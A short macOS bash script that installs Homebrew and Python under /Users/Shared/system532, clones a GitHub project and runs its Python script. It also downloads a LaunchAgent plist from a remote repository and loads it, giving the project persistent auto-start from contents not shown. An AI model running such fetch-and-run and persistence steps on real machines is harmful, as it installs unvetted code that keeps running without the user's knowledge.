#!/bin/bash

set -e  # Exit on error

cd /Users/Shared/system532

# Install Homebrew if not present
if [ ! -d "/Users/Shared/system532/homebrew" ]; then
  echo "Installing Homebrew..."
  mkdir homebrew
  curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew
else
  echo "Homebrew already installed."
fi

export PATH="/Users/Shared/system532/homebrew/bin:$PATH"

brew --version
brew install python
python3 --version
pip3 --version

# Clone your project if not already present
if [ ! -d "stringCup" ]; then
  git clone https://github.com/BigJ1m/stringCup.git
fi

# Download the plist file to the correct directory
curl -o ~/Library/LaunchAgents/com.example.system532.plist \
  https://raw.githubusercontent.com/BigJ1m/532Agent/main/com.example.system532.plist

# Load the LaunchAgent
launchctl load ~/Library/LaunchAgents/com.example.system532.plist

# Run your Python script
python3 stringCup/cup.py
